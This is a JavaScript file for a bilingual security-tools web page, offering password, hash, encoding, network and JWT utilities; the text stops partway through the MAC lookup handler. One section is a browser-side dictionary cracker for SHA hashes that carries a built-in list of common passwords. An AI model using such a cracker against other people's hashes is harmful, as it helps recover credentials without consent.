document.addEventListener('DOMContentLoaded', function() {
    // Detectamos el idioma actual de la página
    const LANG = document.documentElement.lang || 'es';

    // =========================================================
    // 1. Navegación del Desplegable (Segura — mismo origen)
    // =========================================================
    const toolSwitcher = document.getElementById('tool-switcher');
    if (toolSwitcher) {
        toolSwitcher.addEventListener('change', function() {
            const val = this.value;
            if (!val) return;
            // Security: only allow navigation to same-origin URLs (no open redirect)
            try {
                const target = new URL(val, window.location.origin);
                if (target.origin !== window.location.origin) {
                    console.warn('[CyberEscudo] Blocked off-origin navigation:', val);
                    return;
                }
                if (target.href !== window.location.href) {
                    window.location.href = target.href;
                }
            } catch (e) {
                console.warn('[CyberEscudo] Invalid navigation URL:', val);
            }
        });
    }

    // =========================================================
    // 2. Función genérica y segura para copiar al portapapeles
    // =========================================================
    function copyToClipboard(text, btnElement) {
        const originalText = btnElement.textContent;
        // Método moderno (HTTPS)
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(text).then(() => {
                btnElement.textContent = LANG === 'es' ? '✓ Copiado' : '✓ Copied';
                setTimeout(() => { btnElement.textContent = originalText; }, 2000);
            }).catch(err => console.error("Clipboard error:", err));
        } else {
            // Método Fallback (Por si pruebas en localhost o HTTP)
            const ta = document.createElement('textarea');
            ta.value = text;
            ta.style.position = 'absolute';
            ta.style.left = '-9999px';
            document.body.appendChild(ta);
            ta.select();
            try {
                document.execCommand('copy');
                btnElement.textContent = LANG === 'es' ? '✓ Copiado' : '✓ Copied';
                setTimeout(() => { btnElement.textContent = originalText; }, 2000);
            } catch(e) { console.error('Fallback copy error', e); }
            document.body.removeChild(ta);
        }
    }

    // =========================================================
    // 3. Herramienta: What is my IP
    // =========================================================
    const ipVal = document.getElementById('ip-val');
    if (ipVal) {
        const ipMeta = document.getElementById('ip-meta');
        const ipGrid = document.getElementById('ip-grid');

        function fetchIP() {
            ipMeta.textContent = LANG === 'es' ? 'Obteniendo datos de ubicación...' : 'Fetching location data...';
            ipGrid.innerHTML = '';

            fetch('https://ipwho.is/')
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        ipVal.textContent = data.ip; 
                        ipMeta.textContent = data.connection.isp || data.connection.org || '';
                        
                        const fields = LANG === 'es' ? [
                            ['País', data.country], ['Región', data.region], ['Ciudad', data.city],
                            ['Código Postal', data.postal], ['ISP / Org', data.connection.isp], ['ASN', 'AS' + data.connection.asn],
                            ['Zona Horaria', data.timezone.id], ['Latitud', data.latitude], ['Longitud', data.longitude]
                        ] : [
                            ['Country', data.country], ['Region', data.region], ['City', data.city],
                            ['Postal', data.postal], ['ISP / Org', data.connection.isp], ['ASN', 'AS' + data.connection.asn],
                            ['Timezone', data.timezone.id], ['Latitude', data.latitude], ['Longitude', data.longitude]
                        ];
                        
                        let html = '';
                        fields.forEach(f => {
                            html += `<div class="info-card"><div class="info-card-label">${f[0]}</div><div class="info-card-val">${f[1] || '—'}</div></div>`;
                        });
                        ipGrid.innerHTML = html;
                    } else {
                        ipMeta.textContent = LANG === 'es' ? 'Datos de ubicación no disponibles.' : 'Location data not available.';
                    }
                })
                .catch(err => { 
                    ipMeta.textContent = LANG === 'es' 
                        ? 'Ubicación bloqueada por el navegador, pero tu IP es visible arriba.' 
                        : 'Location blocked by browser extensions, but your IP is visible above.'; 
                    console.error("IP Fetch Error:", err);
                });
        }
        
        const btnRefresh = document.getElementById('btn-refresh');
        if (btnRefresh) btnRefresh.addEventListener('click', fetchIP);
        fetchIP(); 
    }

    // =========================================================
    // 4. Herramienta: Password Generator
    // =========================================================
    const lenInput = document.getElementById('pg-len');
    if (lenInput) {
        const lenVal = document.getElementById('len-val');
        const outEl = document.getElementById('passgen-out');

        function generate() {
            const len = parseInt(lenInput.value);
            let chars = '';
            if (document.getElementById('pg-upper').checked) chars += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            if (document.getElementById('pg-lower').checked) chars += 'abcdefghijklmnopqrstuvwxyz';
            if (document.getElementById('pg-num').checked) chars += '0123456789';
            if (document.getElementById('pg-sym').checked) chars += '!@#$%^&*()_+-=[]{}|;:,.<>?';

            if (!chars) {
                outEl.textContent = LANG === 'es' ? 'Selecciona al menos una opción.' : 'Please select at least one option.';
                return;
            }

            const arr = new Uint32Array(len);
            window.crypto.getRandomValues(arr);
            let pass = '';
            for (let i = 0; i < len; i++) { pass += chars[arr[i] % chars.length]; }
            outEl.textContent = pass;
        }

        lenInput.addEventListener('input', function() {
            lenVal.textContent = this.value;
            generate();
        });

        ['pg-upper', 'pg-lower', 'pg-num', 'pg-sym'].forEach(id => {
            const chk = document.getElementById(id);
            if(chk) chk.addEventListener('change', generate);
        });

        const btnGen = document.getElementById('btn-generate');
        if(btnGen) btnGen.addEventListener('click', generate);

        const btnCopy = document.getElementById('btn-copy');
        if(btnCopy) btnCopy.addEventListener('click', function() {
            copyToClipboard(outEl.textContent, this);
        });

        generate(); 
    }

    // =========================================================
    // 5. Herramienta: Fortaleza de Contraseña
    // =========================================================
    const pcIn = document.getElementById('pc-input');
    if (pcIn) {
        function checkPassStrength() {
            const pass = pcIn.value;
            const bar = document.getElementById('pc-bar');
            const label = document.getElementById('pc-label');
            const checksList = document.getElementById('pc-checks');
            const crack = document.getElementById('pc-crack');

            const checks = LANG === 'es' ? [
                ['Mínimo 8 caracteres', pass.length >= 8],
                ['Mínimo 12 caracteres', pass.length >= 12],
                ['Letras mayúsculas (A-Z)', /[A-Z]/.test(pass)],
                ['Letras minúsculas (a-z)', /[a-z]/.test(pass)],
                ['Números (0-9)', /[0-9]/.test(pass)],
                ['Símbolos (!@#$…)', /[^A-Za-z0-9]/.test(pass)]
            ] : [
                ['At least 8 characters', pass.length >= 8],
                ['At least 12 characters', pass.length >= 12],
                ['Uppercase letters (A-Z)', /[A-Z]/.test(pass)],
                ['Lowercase letters (a-z)', /[a-z]/.test(pass)],
                ['Numbers (0-9)', /[0-9]/.test(pass)],
                ['Symbols (!@#$…)', /[^A-Za-z0-9]/.test(pass)]
            ];

            if (!pass) {
                if(bar) bar.style.width = '0%';
                if(label) label.innerHTML = LANG === 'es' ? 'Introduce una contraseña' : 'Enter a password';
                if(checksList) checksList.innerHTML = '';
                if(crack) crack.innerHTML = `⏱ ${LANG === 'es' ? 'Tiempo de crack (GPU):' : 'Crack time (GPU):'} <strong style="color:var(--cyan)">—</strong>`;
                return;
            }

            let score = 0;
            checks.forEach(c => { if(c[1]) score++; });

            const pct = Math.round((score / checks.length) * 100);
            const colors = ['#ff4444','#ff8800','#f0c000','#44cc44','#00ffcc'];
            const labels = LANG === 'es' ? ['Muy débil','Débil','Regular','Fuerte','Muy fuerte'] : ['Very weak','Weak','Fair','Strong','Very strong'];
            const ci = Math.min(Math.floor((score / checks.length) * 4.99), 4);

            if(bar) {
                bar.style.width = pct + '%';
                bar.style.background = colors[ci];
            }
            if(label) label.innerHTML = `<span style="color:${colors[ci]}">${labels[ci]}</span>`;

            let html = '';
            checks.forEach(c => {
                const icon = c[1] ? '✓' : '✗';
                const colorIcon = c[1] ? '#00d45a' : '#ff5050';
                const colorText = c[1] ? 'rgba(255,255,255,.8)' : 'var(--gray)';
                html += `<li style="display:flex; align-items:center; gap:0.5rem; font-family:var(--mono); font-size:0.9rem;"><span style="color:${colorIcon}; font-weight:bold;">${icon}</span> <span style="color:${colorText}">${c[0]}</span></li>`;
            });
            if(checksList) checksList.innerHTML = html;

            let charset = 0;
            if (/[a-z]/.test(pass)) charset += 26;
            if (/[A-Z]/.test(pass)) charset += 26;
            if (/[0-9]/.test(pass)) charset += 10;
            if (/[^A-Za-z0-9]/.test(pass)) charset += 32;

            const combinations = Math.pow(charset || 1, pass.length);
            const secs = combinations / 1e12 / 2;
            let timeStr;

            if (secs < 1) timeStr = LANG === 'es' ? 'Instantáneo' : 'Instant';
            else if (secs < 60) timeStr = Math.round(secs) + (LANG === 'es' ? ' segundos' : ' seconds');
            else if (secs < 3600) timeStr = Math.round(secs/60) + (LANG === 'es' ? ' minutos' : ' minutes');
            else if (secs < 86400) timeStr = Math.round(secs/3600) + (LANG === 'es' ? ' horas' : ' hours');
            else if (secs < 2592000) timeStr = Math.round(secs/86400) + (LANG === 'es' ? ' días' : ' days');
            else if (secs < 31536000) timeStr = Math.round(secs/2592000) + (LANG === 'es' ? ' meses' : ' months');
            else if (secs < 3153600000) timeStr = Math.round(secs/31536000) + (LANG === 'es' ? ' años' : ' years');
            else timeStr = LANG === 'es' ? 'Milenios' : 'Millennia';

            if(crack) crack.innerHTML = `⏱ ${LANG === 'es' ? 'Tiempo de crack (GPU):' : 'Crack time (GPU):'} <strong style="color:var(--cyan)">${timeStr}</strong>`;
        }

        pcIn.addEventListener('input', checkPassStrength);
        
        const btnVis = document.getElementById('btn-vis');
        if (btnVis) {
            btnVis.addEventListener('click', function() {
                const isPass = pcIn.type === 'password';
                pcIn.type = isPass ? 'text' : 'password';
                this.textContent = isPass ? '🙈' : '👁';
            });
        }
    }

    // =========================================================
    // 6. Herramienta: Hash Generator
    // =========================================================
    const hashIn = document.getElementById('hash-input');
    if (hashIn) {
        
        function sanitizeHTML(str) {
            return str.replace(/[&<>'"]/g, 
                tag => ({
                    '&': '&amp;',
                    '<': '&lt;',
                    '>': '&gt;',
                    "'": '&#39;',
                    '"': '&quot;'
                }[tag] || tag)
            );
        }

        async function computeHashes() {
            const rawText = hashIn.value;
            const safeText = sanitizeHTML(rawText);
            const container = document.getElementById('hash-results');
            
            if (!safeText) { 
                container.innerHTML = `<div style="color:var(--gray); text-align:center; padding: 1rem; font-family:var(--mono); font-size:0.9rem;">${LANG === 'es' ? 'Empieza a escribir para generar los hashes.' : 'Start typing to generate hashes.'}</div>`; 
                return; 
            }
            
            if (!window.crypto || !window.crypto.subtle) {
                container.innerHTML = `<div style="color:#ffb74d; padding:1rem; border:1px solid rgba(255,183,77,0.3); border-radius:0.5rem; text-align:center;">⚠️ ${LANG === 'es' ? 'API Crypto no disponible (Requiere HTTPS).' : 'Crypto API not available (Requires HTTPS).'}</div>`;
                return;
            }

            const data = new TextEncoder().encode(safeText);
            const algos = ['SHA-1','SHA-256','SHA-384','SHA-512'];
            let html = '';
            
            for (let algo of algos) {
                try {
                    const buf = await window.crypto.subtle.digest(algo, data);
                    const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
                    
                    html += `
                        <div style="display:grid; grid-template-columns: 80px 1fr 36px; align-items:center; gap:0.75rem; background:var(--bg-card2); border:1px solid var(--border2); border-radius:0.5rem; padding:0.75rem 1rem; margin-bottom: 0.75rem; transition: border-color 0.2s;">
                            <div style="color:var(--cyan); font-weight:600; font-family:var(--mono); font-size:0.8rem;">${algo}</div>
                            <div style="color:rgba(255,255,255,.85); word-break:break-all; font-family:var(--mono); font-size:0.85rem;">${hex}</div>
                            <button type="button" class="hash-copy" data-hash="${hex}" style="background:transparent; border:none; color:rgba(0,255,255,0.5); cursor:pointer; font-size:1.1rem; transition:color 0.2s; padding:0;" title="${LANG === 'es' ? 'Copiar' : 'Copy'}">📋</button>
                        </div>`;
                } catch(e) {
                    console.error(`Error procesando ${algo}:`, e);
                }
            }
            container.innerHTML = html;
        }
        
        hashIn.addEventListener('input', computeHashes);
        
        const resultsDiv = document.getElementById('hash-results');
        if (resultsDiv) {
            resultsDiv.addEventListener('click', function(e) {
                if (e.target && e.target.classList.contains('hash-copy')) {
                    copyToClipboard(e.target.getAttribute('data-hash'), e.target);
                    e.target.style.color = 'var(--cyan)'; 
                }
            });
        }
    }

    // =========================================================
    // 7. Herramienta: Base64 Encoder/Decoder
    // =========================================================
    const btnB64Enc = document.getElementById('btn-b64-enc');
    if (btnB64Enc) {
        btnB64Enc.addEventListener('click', function() {
            try {
                const out = btoa(unescape(encodeURIComponent(document.getElementById('b64-in').value)));
                document.getElementById('b64-out').textContent = out;
            } catch(e) { document.getElementById('b64-out').textContent = 'Error: ' + e.message; }
        });
        
        document.getElementById('btn-b64-dec').addEventListener('click', function() {
            try {
                const out = decodeURIComponent(escape(atob(document.getElementById('b64-in').value.trim())));
                document.getElementById('b64-out').textContent = out;
            } catch(e) { 
                document.getElementById('b64-out').textContent = LANG === 'es' ? 'Error: Base64 inválido.' : 'Error: Invalid Base64.'; 
            }
        });
        
        document.getElementById('btn-b64-copy').addEventListener('click', function() { 
            copyToClipboard(document.getElementById('b64-out').textContent, this); 
        });
    }

    // =========================================================
    // 8. Herramienta: CIDR Calculator
    // =========================================================
    const cidrIn = document.getElementById('cidr-in');
    if (cidrIn) {
        function calcCIDR() {
            const val = cidrIn.value.trim();
            const parts = val.split('/');
            const container = document.getElementById('cidr-results');
            if (parts.length !== 2) { container.innerHTML = ''; return; }
            
            const ip = parts[0]; 
            const prefix = parseInt(parts[1]);
            
            if (isNaN(prefix) || prefix < 0 || prefix > 32) { container.innerHTML = ''; return; }
            
            const octets = ip.split('.').map(Number);
            if (octets.length !== 4 || octets.some(o => isNaN(o)||o<0||o>255)) { container.innerHTML=''; return; }
            
            const ipInt = octets.reduce((a,b) => (a<<8|b)>>>0, 0);
            const mask = prefix === 0 ? 0 : (0xFFFFFFFF << (32-prefix)) >>> 0;
            const net = (ipInt & mask) >>> 0;
            const bcast = (net | (~mask >>> 0)) >>> 0;
            const first = prefix < 31 ? (net + 1) >>> 0 : net;
            const last = prefix < 31 ? (bcast - 1) >>> 0 : bcast;
            const hosts = prefix >= 31 ? Math.pow(2, 32-prefix) : Math.max(0, (bcast - net - 1));
            
            const i2ip = n => [(n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255].join('.');
            const wildcard = i2ip(~mask >>> 0);
            
            const rows = LANG === 'es' ? [
                ['Red', i2ip(net)], ['Broadcast', i2ip(bcast)], ['Primer host', i2ip(first)],
                ['Último host', i2ip(last)], ['Máscara', i2ip(mask)], ['Wildcard', wildcard],
                ['Prefijo', '/'+prefix], ['Hosts usables', hosts.toLocaleString()], ['Total IPs', Math.pow(2,32-prefix).toLocaleString()]
            ] : [
                ['Network', i2ip(net)], ['Broadcast', i2ip(bcast)], ['First host', i2ip(first)],
                ['Last host', i2ip(last)], ['Subnet mask', i2ip(mask)], ['Wildcard', wildcard],
                ['Prefix', '/'+prefix], ['Usable hosts', hosts.toLocaleString()], ['Total IPs', Math.pow(2,32-prefix).toLocaleString()]
            ];
            
            let html = '';
            rows.forEach(r => { 
                html += `<div class="info-card"><div class="info-card-label">${r[0]}</div><div class="info-card-val">${r[1]}</div></div>`; 
            });
            container.innerHTML = html;
        }
        cidrIn.addEventListener('input', calcCIDR);
        calcCIDR();
    }

    // =========================================================
    // 9. Herramienta: JWT Decoder
    // =========================================================
    const jwtIn = document.getElementById('jwt-in');
    if (jwtIn) {
        jwtIn.addEventListener('input', function() {
            const token = this.value.trim();
            const container = document.getElementById('jwt-results');
            if (!token) { container.innerHTML = ''; return; }
            
            const parts = token.split('.');
            if (parts.length < 2) { 
                container.innerHTML = `<div style="color:#ffb74d; padding:1rem; border:1px solid #ffb74d; border-radius:0.5rem; margin-top:1rem;">${LANG === 'es' ? 'Token JWT inválido.' : 'Invalid JWT token.'}</div>`; 
                return; 
            }
            
            const decode = str => {
                try {
                    str = str.replace(/-/g,'+').replace(/_/g,'/');
                    const pad = str.length % 4; if (pad) str += '===='.slice(pad);
                    return JSON.parse(decodeURIComponent(escape(atob(str))));
                } catch(e) { return null; }
            };
            
            const header = decode(parts[0]); 
            const payload = decode(parts[1]);
            let html = '';
            
            const blockStyle = 'background:rgba(0,0,0,.4); border:1px solid var(--border); border-radius:.4rem; padding:.85rem 1rem; font-family:var(--mono); font-size:.8rem; color:rgba(255,255,255,.85); white-space:pre-wrap; word-break:break-all;';
            const labelStyle = 'font-family:var(--mono); font-size:.68rem; color:var(--cyan); text-transform:uppercase; letter-spacing:.12em; margin-bottom:.4rem; margin-top:1rem; display:block;';
            
            if (header) {
                html += `<div><strong style="${labelStyle}">Header</strong><div style="${blockStyle}">${JSON.stringify(header,null,2)}</div></div>`;
            }
            if (payload) {
                const display = JSON.parse(JSON.stringify(payload));
                ['iat','exp','nbf'].forEach(k => { if(display[k]) display[k+'_human'] = new Date(display[k]*1000).toLocaleString(); });
                html += `<div><strong style="${labelStyle}">Payload</strong><div style="${blockStyle}">${JSON.stringify(display,null,2)}</div></div>`;
                
                if (payload.exp) {
                    const expired = payload.exp * 1000 < Date.now();
                    html += `<div style="color:${expired ? '#ff5050' : '#00d45a'}; margin-top:1rem; font-family:var(--mono); font-weight:600;">${expired ? (LANG === 'es' ? '⚠ Token EXPIRADO' : '⚠ Token EXPIRED') : (LANG === 'es' ? '✓ Token vigente' : '✓ Token valid')}</div>`;
                }
            }
            html += `<div style="color:var(--gray); margin-top:0.5rem; font-size:0.85rem;">🔑 ${LANG === 'es' ? 'La firma NO se verifica. Solo inspección.' : 'Signature NOT verified. Inspection only.'}</div>`;
            container.innerHTML = html;
        });
    }

    // =========================================================
    // 10. Herramienta: URL Encoder
    // =========================================================
    const btnUrlEnc = document.getElementById('btn-url-enc');
    if (btnUrlEnc) {
        btnUrlEnc.addEventListener('click', function() {
            document.getElementById('url-out').textContent = encodeURIComponent(document.getElementById('url-in').value);
        });
        
        document.getElementById('btn-url-dec').addEventListener('click', function() {
            try { 
                document.getElementById('url-out').textContent = decodeURIComponent(document.getElementById('url-in').value); 
            } catch(e) { 
                document.getElementById('url-out').textContent = LANG === 'es' ? 'Error: URL inválida.' : 'Error: Invalid URL.'; 
            }
        });
        
        document.getElementById('btn-url-copy').addEventListener('click', function() { 
            copyToClipboard(document.getElementById('url-out').textContent, this); 
        });
    }

    // =========================================================
    // 11. Herramienta: Hash Analyzer & Cracker
    // =========================================================
    const hcIn = document.getElementById('hc-input');
    if (hcIn) {
        const btnAnalyze = document.getElementById('btn-analyze-hash');
        const resultsBox = document.getElementById('hc-results');
        const hcTypes = document.getElementById('hc-types');
        const hcCrack = document.getElementById('hc-crack');

        let dictionary = [];
        let isDownloading = false;

        const fallbackDict = [
            "123456", "password", "123456789", "12345678", "12345", "111111", "1234567",
            "sunshine", "qwerty", "iloveyou", "admin", "welcome", "123123", "password123",
            "admin123", "root", "toor", "1234567890", "letmein", "monkey", "dragon", 
            "baseball", "soccer", "football", "superman", "batman", "starwars", "abc123"
        ];

        function sanitizeInput(str) {
            return str.replace(/[&<>'"]/g, tag => ({'&':'&amp;', '<':'&lt;', '>':'&gt;', "'":'&#39;', '"':'&quot;'}[tag]));
        }

        async function analyzeAndCrack() {
            const rawHash = hcIn.value.trim();
            if (!rawHash) return;

            const hash = sanitizeInput(rawHash).toLowerCase();
            resultsBox.style.display = 'block';
            hcTypes.innerHTML = '';
            hcCrack.innerHTML = `<span style="color:var(--gray)">${LANG === 'es' ? 'Analizando...' : 'Analyzing...'}</span>`;

            let possibleTypes = [];
            const len = hash.length;

            if (/^[a-f0-9]{32}$/.test(hash)) possibleTypes.push("MD5", "MD4", "NTLM");
            else if (/^[a-f0-9]{40}$/.test(hash)) possibleTypes.push("SHA-1", "MySQL5");
            else if (/^[a-f0-9]{64}$/.test(hash)) possibleTypes.push("SHA-256", "SHA3-256");
            else if (/^[a-f0-9]{96}$/.test(hash)) possibleTypes.push("SHA-384", "SHA3-384");
            else if (/^[a-f0-9]{128}$/.test(hash)) possibleTypes.push("SHA-512", "SHA3-512");
            else if (hash.startsWith('$')) possibleTypes.push(LANG === 'es' ? "Bcrypt/Crypt (Complejo)" : "Bcrypt/Crypt (Complex)");
            
            if (possibleTypes.length === 0) possibleTypes.push(LANG === 'es' ? "Formato no estándar" : "Non-standard format");

            hcTypes.innerHTML = possibleTypes.map(t => `<span style="display:inline-block; padding: 0.2rem 0.6rem; background:rgba(0,255,255,0.1); border:1px solid rgba(0,255,255,0.3); border-radius:0.25rem; color:var(--cyan); font-size:0.8rem; font-family:var(--mono);">${t}</span>`).join('');

            if (dictionary.length === 0) {
                if (isDownloading) return;
                isDownloading = true;
                hcCrack.innerHTML = `<span style="color:var(--cyan)">${LANG === 'es' ? 'Cargando wordlist...' : 'Loading wordlist...'}</span>`;
                
                try {
                    const response = await fetch('/assets/js/wordlist.txt');
                    if (response.ok) {
                        const text = await response.text();
                        dictionary = text.split('\n').map(w => w.trim()).filter(w => w.length > 0);
                    } else {
                        throw new Error("HTTP error");
                    }
                } catch(e) {
                    dictionary = fallbackDict;
                    hcCrack.innerHTML = `<span style="color:#f0a000; font-size:0.85rem;">⚠️ ${LANG === 'es' ? 'Conexión bloqueada. Usando diccionario de emergencia.' : 'Connection blocked. Using fallback dictionary.'}</span><br><br>`;
                }
                isDownloading = false;
            }

            if (!window.crypto || !window.crypto.subtle) {
                hcCrack.innerHTML += `<span style="color:#ffb74d">⚠️ API Crypto no disponible.</span>`;
                return;
            }

            if (hash.startsWith('$')) {
                hcCrack.innerHTML += `<span style="color:var(--gray)">${LANG === 'es' ? 'Los hashes complejos requieren fuerza bruta en servidor (Hashcat).' : 'Complex hashes require server-side cracking (Hashcat).'}</span>`;
                return;
            }

            let algosToTest = [];
            if (len === 40) algosToTest.push("SHA-1");
            else if (len === 64) algosToTest.push("SHA-256");
            else if (len === 96) algosToTest.push("SHA-384"); 
            else if (len === 128) algosToTest.push("SHA-512");

            if (algosToTest.length === 0) {
                 if (len === 32) {
                    hcCrack.innerHTML += `<span style="color:#f0a000">⚠️ ${LANG === 'es' ? 'Probable MD5/NTLM. Los navegadores modernos bloquean el cálculo nativo de MD5.' : 'Likely MD5/NTLM. Modern browsers block native MD5 computation.'}</span>`;
                 } else {
                    hcCrack.innerHTML += `<span style="color:var(--gray)">${LANG === 'es' ? 'Formato no soportado por el motor local.' : 'Format not supported by local engine.'}</span>`;
                 }
                 return;
            }

            hcCrack.innerHTML += `<span style="color:var(--cyan)">${LANG === 'es' ? `Ejecutando ataque (${dictionary.length} palabras)...` : `Running attack (${dictionary.length} words)...`}</span>`;
            await new Promise(r => setTimeout(r, 50));

            let crackedWord = null;
            const encoder = new TextEncoder();

            for (let i = 0; i < dictionary.length; i++) {
                const word = dictionary[i];
                const data = encoder.encode(word);
                for (let algo of algosToTest) {
                    try {
                        const buf = await window.crypto.subtle.digest(algo, data);
                        const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
                        if (hex === hash) {
                            crackedWord = word;
                            break;
                        }
                    } catch(e) {}
                }
                if (crackedWord) break;
            }

            if (crackedWord) {
                hcCrack.innerHTML = `<span style="color:#00d45a; font-weight:bold;">[✓] ${LANG === 'es' ? '¡CRACKEADO!' : 'CRACKED!'}:</span> <span style="color:var(--white);">${crackedWord}</span>`;
            } else {
                hcCrack.innerHTML = `<span style="color:#ff5050">[✗] ${LANG === 'es' ? 'Hash no encontrado en el diccionario.' : 'Hash not found in dictionary.'}</span>`;
            }
        }

        btnAnalyze.addEventListener('click', analyzeAndCrack);
    }
	// =========================================================
    // 12. Herramienta: Calculadora Chmod (Nuevo Diseño)
    // =========================================================
    const chmodNumber = document.getElementById('chmodNumber');
    if (chmodNumber) {
        const valueByPermission = { r: 4, w: 2, x: 1 };
        const groups = ['owner', 'group', 'others'];

        function getCheckbox(group, sym) {
            return document.querySelector('.perm-cb[data-group="' + group + '"][data-sym="' + sym + '"]');
        }

        function getGroupNumber(group) {
            let total = 0;
            ['r', 'w', 'x'].forEach(function (sym) {
                const checkbox = getCheckbox(group, sym);
                if (checkbox && checkbox.checked) {
                    total += valueByPermission[sym];
                }
            });
            return total;
        }

        function getGroupSymbol(group) {
            const read = getCheckbox(group, 'r');
            const write = getCheckbox(group, 'w');
            const execute = getCheckbox(group, 'x');
            return [
                read && read.checked ? 'r' : '-',
                write && write.checked ? 'w' : '-',
                execute && execute.checked ? 'x' : '-'
            ].join('');
        }

        function setText(selector, value) {
            const element = document.querySelector(selector);
            if (element) {
                element.textContent = value;
            }
        }

        function updateChmodCalculator() {
            const owner = getGroupNumber('owner');
            const group = getGroupNumber('group');
            const others = getGroupNumber('others');

            const numeric = String(owner) + String(group) + String(others);
            const symbolic = groups.map(getGroupSymbol).join('');

            setText('#chmodNumber', numeric);
            setText('#chmodSymbolic', symbolic);
            setText('#chmodCommand', 'chmod ' + numeric + ' archivo');
        }

        // Escucha el evento change de los checkboxes
        document.addEventListener('change', function (event) {
            if (event.target && event.target.classList.contains('perm-cb')) {
                updateChmodCalculator();
            }
        });

        // Botón Reiniciar
        const btnReset = document.getElementById('chmodReset');
        if (btnReset) {
            btnReset.addEventListener('click', function() {
                document.querySelectorAll('.perm-cb').forEach(cb => cb.checked = false);
                updateChmodCalculator();
            });
        }

        // Carga inicial
        updateChmodCalculator();
    }
	// =========================================================
    // 13. Herramienta: Generador Regex Contraseñas
    // =========================================================
    const lenInputRegex = document.getElementById('regex-len');
    if (lenInputRegex) {
        const lenVal = document.getElementById('regex-len-val');
        const outBox = document.getElementById('regex-out');
        const testInput = document.getElementById('regex-test');
        const testIndicator = document.getElementById('regex-indicator');
        const testMsg = document.getElementById('regex-test-msg');
        
        let currentRegexObj = null;

        function generateRegex() {
            const minLen = lenInputRegex.value;
            const reqLower = document.getElementById('rx-lower').checked;
            const reqUpper = document.getElementById('rx-upper').checked;
            const reqNum = document.getElementById('rx-num').checked;
            const reqSym = document.getElementById('rx-sym').checked;
            const noSpace = document.getElementById('rx-space').checked;

            let regexStr = "^"; // Inicio de línea
            
            // Lookaheads para asegurar que existan los caracteres
            if (reqLower) regexStr += "(?=.*[a-z])";
            if (reqUpper) regexStr += "(?=.*[A-Z])";
            if (reqNum)   regexStr += "(?=.*\\d)";
            if (reqSym)   regexStr += "(?=.*[@$!%*?&._-])";

            // Cuantificador final y bloqueo de espacios
            if (noSpace) {
                regexStr += "[^\\s]"; 
            } else {
                regexStr += ".";      
            }

            regexStr += "{" + minLen + ",}$"; // Longitud mínima y fin de línea

            if (outBox) outBox.textContent = regexStr;
            currentRegexObj = new RegExp(regexStr);
            
            validateTester(); // Reevaluar el tester si hay algo escrito
        }

        function validateTester() {
            if (!testInput) return;
            const text = testInput.value;
            
            if (!text) {
                if (testIndicator) testIndicator.innerHTML = "";
                if (testMsg) testMsg.textContent = "";
                testInput.style.borderColor = "rgba(0, 255, 255, 0.2)";
                return;
            }

            if (currentRegexObj && currentRegexObj.test(text)) {
                if (testIndicator) testIndicator.innerHTML = "✅";
                if (testMsg) {
                    testMsg.textContent = LANG === 'es' ? '¡La contraseña cumple todas las reglas!' : 'Password meets all rules!';
                    testMsg.style.color = "#00d45a";
                }
                testInput.style.borderColor = "#00d45a";
            } else {
                if (testIndicator) testIndicator.innerHTML = "❌";
                if (testMsg) {
                    testMsg.textContent = LANG === 'es' ? 'La contraseña no cumple con la política.' : 'Password does not meet the policy.';
                    testMsg.style.color = "#ff5050";
                }
                testInput.style.borderColor = "#ff5050";
            }
        }

        // Eventos
        lenInputRegex.addEventListener('input', function() {
            if (lenVal) lenVal.textContent = this.value;
            generateRegex();
        });

        document.querySelectorAll('.rx-rule').forEach(cb => {
            cb.addEventListener('change', generateRegex);
        });

        if (testInput) testInput.addEventListener('input', validateTester);

        const copyBtnRegex = document.getElementById('btn-regex-copy');
        if (copyBtnRegex) {
            copyBtnRegex.addEventListener('click', function() {
                copyToClipboard(outBox.textContent, this);
            });
        }

        generateRegex(); // Disparar en la primera carga
    }
	// =========================================================
    // 14. Herramienta: Buscador MAC (OUI Lookup)
    // =========================================================
    const macInput = document.getElementById('mac-input');
    if (macInput) {
        const btnMacSearch = document.getElementById('btn-mac-search');
        const macResults = document.getElementById('mac-results');
        const macVendorName = document.getElementById('mac-vendor-name');
        const macDetails = document.getElementById('mac-details');

        macInput.addEventListener('input', function(e) {
            let val = this.value.replace(/[^a-fA-F0-9]/g, '').toUpperCase();
            if (val.length > 12) val = val.substring(0, 12);
            let formatted = val.match(/.{1,2}/g);
            if (formatted) {
                this.value = formatted.join(':');
            }
        });

        macInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                btnMacSearch.click();
            }
        });

        btnMacSearch.addEventListener('click', async function() {
            const rawMac = macInput.value.trim();
            
            if (!/^([0-9A-Fa-f]{2}[:-]?){5}([0-9A-Fa-f]{2})$/.test(rawMac)) {
                macResults.style.display = 'block';
                macVendorName.style.color = '#ff5050';
                macVendorName.textContent = LANG === 'es' ? '❌ Dirección MAC inválida' : '❌ Invalid MAC Address';
                macDetails.innerHTML = '';
                return;
            }

            macResults.style.display = 'block';
            macVendorName.style.color = 'var(--gray)';
            macVendorName.textContent = LANG === 'es' ? 'Buscando en la base de datos...' : 'Searching database...';
            macDetails.innerHTML = '';

            try {
                // --- MAGIA: Ahora llamamos a nuestro propio servidor PHP ---
                const response = await fetch(`?api_mac=${rawMac}`);
                
                if (!response.ok) throw new Error('Error de red');
                
                const data = await response.json();
                
                if (data.success && data.found) {
                    macVendorName.style.color = '#00d45a';
                    macVendorName.textContent = `🏢 ${data.company}`;
                    
                    const fields = LANG === 'es' ? [
                        ['Prefijo (OUI)', data.macPrefix],
                        ['Dirección', data.address || '—'],
                        ['País', data.country || '—'],
                        ['Actualizado', data.updated || '—']
                    ] : [
                        ['Prefix (OUI)', data.macPrefix],
                        ['Address', data.address || '—'],
                        ['Country', data.country || '—'],
                        ['Updated', data.updated || '—']
                    ];
                    
                    let html = '';
                    fields.forEach(f => {
                        html += `<div class="info-card"><div class="info-card-label">${f[0]}</div><div class="info-card-val">${f[1]}</div></div>`;
                    });
                    macDetails.innerHTML = html;
                } else {
                    macVendorName.style.color = '#ffb74d';
                    macVendorName.textContent = LANG === 'es' ? '⚠️ Fabricante desconocido' : '⚠️ Unknown vendor';
                }
            } catch (err) {
                macVendorName.style.color = '#ff5050';
